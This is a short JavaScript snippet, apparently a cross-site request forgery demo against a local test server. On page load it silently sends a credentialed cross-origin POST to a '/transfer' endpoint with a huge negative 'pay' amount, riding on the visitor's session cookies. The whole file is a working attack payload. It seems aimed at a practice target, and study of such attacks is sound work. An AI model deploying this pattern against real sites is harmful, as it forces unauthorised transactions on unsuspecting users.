
window.addEventListener('load',()=>{
   

const body = new FormData();
body.append('pay', -1000000000000);
const methot = "POST"

fetch(('http://localhost:5001/transfer'), {
   method: 'POST',
   mode: 'cors',
   credentials: 'include',
   "body":body
}).then(async (res) => {
   if (res.status == 200) {
      return await res.json();
   }
   alert("error\nステータスコード:" + res.status);
}).then((data) => {
   console.log(data)
});



})

